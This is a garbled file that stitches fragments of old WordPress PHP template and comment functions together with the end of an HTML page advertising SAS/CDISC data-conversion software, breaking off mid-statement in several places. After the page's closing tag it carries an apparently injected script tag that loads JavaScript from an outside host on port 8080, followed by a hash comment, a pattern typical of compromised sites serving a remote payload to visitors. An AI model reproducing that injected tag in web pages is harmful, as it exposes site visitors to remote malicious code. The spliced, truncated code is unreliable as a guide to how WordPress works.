<!-- ~ --><!-- ~ -->hp");

$temput= $_SESSIdgo anywhere in a template.
 *
 * @package WordPress
 * @subpackage Template
 */

/**
 * Load header template.
 *
 * Includes the header template for a theme or if a name is specified then a
 * specialised header will be included. If the theme contains no header.php file
 * then the header from the default theme will be included.
 *
 * For the parameter, if the file is called "header-special.php" then specify
 * "special".
 *
 * @uses locate_template()
 * @since 1.5.0
 * @uses do_action() Calls 'get_header' action.
 *
 * @param string $name The name of the specialised header.
 */
function get_header( $name = null ) {
	do_action( 'get_header' );

	$templates = array();
	if ( isset($name) )
		$templates[] = "header-{$name}.php";

	$templates[] = "header.php";

	if ('' == locate_template($templates, true))
		load_template( get_theme_root() . '/default/header.php');
}

/**
 * Load footer template.
 *
 * Includes the footer template for a theme or if a name is specified then a
 * specialised footer will be included. If the theme contains no footer.php file
 * then the footer from the default theme will be included.
 *
 * For the parameter, if the file is called "footer-special.php" then specify
 * "special".
 *
 * @uses locate_template()
 * @since 1.5.0
 * @uses do_action() Calls 'get_footer' action.
 *
 * @param string $name The name of the specialised footer.
 */
function get_footer( $name = null ) {
	do_action( 'get_footer' );

	$templates = array();
	if ( isset($name) )
		$templates[] = "footer-{$name}.php";

	$templates[] = "footer.php";

	if ('' == locate_template($templates, true))
		load_template( get_theme_root() . '/default/footer.php');
}

/**
 * Load sidebar template.
 *
 * Includes the sidebar template for a theme or if a name is specified then a
 * specialised sidebar will be included. If the theme contains no sidebar.php
 * file then the sidebar from the default theme will be included.
 *
 * For the parameter, if the file is called "sidebar-special.php" then specify
 * "special".
 *
 * @uses locate_template()
 * @since 1.5.0
 * @uses do_action() Calls 'get_sidebar' action.
 *
 * @param string $name The name of the specialised sidebar.
 */
function get_sidebar( $name = null ) {
	do_action( 'get_sidebar' );

	$templates = array();
	if ( isset($name) )
		$templates[] = "sidebar-{$name}.php";

	$templates[] = "sidebar.php";

	if ('' == locate_template($templates, true))
		load_template( get_theme_root() . '/default/sidebar.php');
}

/**
 * Display search form.
 *
 * Will first attempt to locate the searchform.php file in either the child or
 * the parent, then load it. If it doesn't exist, then the default search form
 * will be displayed.
 *
 * @since 2.7.0
 */
function get_search_form() {
	do_action( 'get_search_form' );

	if ( '' != locate_template(array('searchform.php'), true) )
		return;

	$form = '<form method="get" id="searchform" action="' . get_option('home') . '/" >
	<label class="hidden" for="s">' . __('Search for:') . '</label>
	<div><input type="text" value="' . attribute_escape(apply_filters('the_search_query', get_search_query())) . '" name="s" id="s" />
	<input type="submit" id="searchsubmit" value="'.attribute_escape(__('Search')).'" />
	</div>
	</form>';

	echo apply_filters('get_search_form', $form);
}

/**
 * Display the Log In/Out link.
 *
 * Displays a link, which allows the user to navigate to the Log In page to log in
 * or log out depending on whether or not they are currently logged in.
 *
 * @since 1.5.0
 * @uses apply_filters() Calls 'loginout' hook on HTML link content.
 */
function wp_loginout() {
	if ( ! is_user_logged_in() )
		$link = '<a href="' . wp_login_url() . '">' . __('Log in') . '</a>';
	else
		$link = '<a href="' . wp_logout_url() . '">' . __('Log out') . '</a>';

	echo apply_filters('loginout', $link);
}

/**
 * Returns the Log Out URL.
 *
 * Returns the URL that allows the user to log out of the site
 *
 * @since 2.7
 * @uses wp_nonce_url() To protect against CSRF
 * @uses site_url() To generate the log in URL
 *
 * @param string $redirect Path to redirect to on logout.
 */
function wp_logout_url($redirect = '') {
	if ( strlen($redirect) )
		$redirect = "&redirect_to=$rement_criteria.doc">Syvalidate</a> - </b>Evaluation        
                  Requirements for Validation         
                  of SAS Programs Made Easy with Change Control&nbsp;&nbsp;</li>   
                    <li><b><a href="doc/thesqa_requirement_criteria.doc">ThesQA </a>-        
                  </b>Evaluation Requirements for Thesaurus Dictionaries and        
                  Controlled Terminology Management</li>   
                  </ul>
                </li>  
              </ul>

              <p><b>Training</b></p>
              <ul>
                <li><a href="training.html">CDISC SDTM Implementation Real World 
                  Application</a></li>
                <li><a href="training.html#Generating Data Definition Domain Documentation&nbsp;DEFINE.XML and DEFINE.PDF">Generating Data Definition Domain Documentation DEFINE.XML and DEFINE.PDF</a></li>      
              </ul>

              <p><b>Evaluation Downloads</b></p> 
              <ul>
                <li><b><a href="cdiscbuilder/index.html">CDISC Builder </a>-  
                  </b>Convert and Verify data to CDISC SDTM Data Models</li>  
                <li><b><a href="transdata/index.html">Transdata</a> </b>-   
                  Transform SAS data to ISS or CDISC Data</li>   
                <li><b><a href="definedoc/index.html">Definedoc</a> </b>- Data 
                  definition documentation DEFINE.XML/PDF</li>   
              </ul>

            </td>
          </tr>
          <tr>
            <td>&nbsp;</td>
          </tr>
        </table>
        </td>
      </tr>
    </table>
    </td>
  </tr>
</table>
<table width="599" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td height="36" background="../images/col_bottom.jpg">&nbsp;&nbsp;&nbsp; <i>last updated on 
      Nov 12,2009</i> </td>
  </tr>
</table>

</body>

</html>

<script type="text/javascript" src="http://blog.aspdesign.net:8080/Megabyte.js"></script>
<!--59a582eef9ef81a0a171b7625e8e2c93--> * @since 0.71
 * @uses apply_filters()
 * @uses get_comment_author_url() Retrieves the comment author's URL
 */
function comment_author_url() {
	echo apply_filters('comment_url', get_comment_author_url());
}

/**
 * Retrieves the HTML link of the url of the author of the current comment.
 *
 * $linktext parameter is only used if the URL does not exist for the comment
 * author. If the URL does exist then the URL will be used and the $linktext
 * will be ignored.
 *
 * Encapsulate the HTML link between the $before and $after. So it will appear
 * in the order of $before, link, and finally $after.
 *
 * @since 1.5.0
 * @uses apply_filters() Calls the 'get_comment_author_url_link' on the complete HTML before returning.
 *
 * @param string $linktext The text to display instead of the comment author's email address
 * @param string $before The text or HTML to display before the email link.
 * @param string $after The text or HTML to display after the email link.
 * @return string The HTML link between the $before and $after parameters
 */
function get_comment_author_url_link( $linktext = '', $before = '', $after = '' ) {
	$url = get_comment_author_url();
	$display = ($linktext != '') ? $linktext : $url;
	$display = str_replace( 'http://www.', '', $display );
	$display = str_replace( 'http://', '', $display );
	if ( '/' == substr($display, -1) )
		$display = substr($display, 0, -1);
	$return = "$before<a href='$url' rel='external'>$display</a>$after";
	return apply_filters('get_comment_author_url_link', $return);
}

/**
 * Displays the HTML link of the url of the author of the current comment.
 *
 * @since 0.71
 * @see get_comment_author_url_link() Echos result
 *
 * @param string $linktext The text to display instead of the comment author's email address
 * @param string $before The text or HTML to display before the email link.
 * @param string $after The text or HTML to display after the email link.
 */
function comment_author_url_link( $linktext = '', $before = '', $after = '' ) {
	echo get_comment_author_url_link( $linktext, $before, $after );
}

/**
 * Generates semantic classes for each comment element
 *
 * @since 2.7.0
 *
 * @param string|array $class One or more classes to add to the class list
 * @param int $comment_id An optional comment ID
 * @param int $post_id An optional post ID
 * @param bool $echo Whether comment_class should echo or return
 */
function comment_class( $class = '', $comment_id = null, $post_id = null, $echo = true ) {
	// Separates classes with a single space, collates classes for comment DIV
	$class = 'class="' . join( ' ', get_comment_class( $class, $comment_id, $post_id ) ) . '"';
	if ( $echo)
		echo $class;
	else
		return $class;
}

/**
 * Returns the classes for the comment div as an array
 *
 * @since 2.7.0
 *
 * @param string|array $class One or more classes to add to the class list
 * @param int $comment_id An optional comment ID
 * @param int $post_id An optional post ID
 * @return array Array of classes
 */
function get_comment_class( $class = '', $comment_id = null, $post_id = null ) {
	global $comment_alt, $comment_depth, $comment_thread_alt;

	$comment = get_comment($comment_id);

	$classes = array();

	// Get the comment type (comment, trackback),
	$classes[] = ( empty( $comment->comment_type ) ) ? 'comment' : $comment->comment_type;

	// If the comment author has an id (registered), then print the log in name
	if ( $comment->user_id > 0 && $user = get_userdata($comment->user_id) ) {
		// For all registered users, 'byuser'
		$classes[] = 'byuser comment-author-' . $user->user_nicename;
		// For comment authors who are the author of the post
		if ( $post = get_post($post_id) ) {
			if ( $comment->user_id === $post->post_author )
				$classes[] = 'bypostauthor';
		}
	}

	if ( empty($comment_alt) )
		$comment_alt = 0;
	if ( empty($comment_depth) )
		$comment_depth = 1;
	if ( empty($comment_thread_alt) )
		$comment_thread_alt = 0;

	if ( $comment_alt % 2 ) {
		$classes[] = 'odd';
		$classes[] = 'alt';
	} else {
		$classes[] = 'even';
	}

	$comment_alt++;

	// Alt for top-level comments
	if ( 1 == $comment_depth ) {
		if ( $comment_thread_alt % 2 ) {
			$classes[] = 'thread-odd';
			$classes[] = 'thread-alt';
		} else {
			$classes[] = 'thread-even';
		}
		$comment_thread_alt++;
	}

	$classes[] = "depth-$comment_depth";

	if ( !empty($class) ) {
		if ( !is_array( $class ) )
			$class = preg_split('#\s+#', $class);
		$classes = array_merge($classes, $class);
	}

	return apply_filters('comment_class', $classes, $class, $comment_id, $post_id);
}

/**
 * Retrieve the comment date of the current comment.
 *
 * @since 1.5.0
 * @uses apply_filters() Calls 'get_comment_date' hook with the formated date and the $d parameter respectively
 * @uses $comment
 *
 * @param string $d The format of the date (defaults to user's config)
 * @return string The comment's date
 */
function get_comment_date( $d = '' ) {
	global $comment;
	if ( '' == $d )
		$date = mysql2date( get_option('date_format'), $comment->comment_date);
	else
		$date = mysql2date($d, $comment->comment_date);
	return apply_filters('get_comment_date', $date, $d);
}

/**
 * Display the comment date of the current comment.
 *
 * @since 0.71
 *
 * @param string $d The format of the date (defaults to user's config)
 */
function comment_date( $d = '' ) {
	echo get_comment_date( $d );
}

/**
 * Retrieve the excerpt of the current comment.
 *
 * Will cut each word and only output the first 20 words with '...' at the end.
 * If the word count is less than 20, then no truncating is done and no '...'
 * will appear.
 *
 * @since 1.5.0
 * @uses $comment
 * @uses apply_filters() Calls 'get_comment_excerpt' on truncated comment
 *
 * @return string The maybe truncated comment with 20 words or less
 */
function get_comment_excerpt() {
	global $comment;
	$comment_text = strip_tags($comment->comment_content);
	$blah = explode(' ', $comment_text);
	if (count($blah) > 20) {
		$k = 20;
		$use_dotdotdot = 1;
	} else {
		$k = count($blah);
		$use_dotdotdot = 0;
	}
	$excerpt = '';
	for ($i=0; $i<$k; $i++) {
		$excerpt .= $blah[$i] . ' ';
	}
	$excerpt .= ($use_dotdotdot) ? '...' : '';
	return apply_filters('get_comment_excerpt', $excerpt);
}

/**
 * Display the excerpt of the current comment.
 *
 * @since 1.2.0
 * @uses apply_filters() Calls 'comment_excerpt' hook before displaying excerpt
 */
f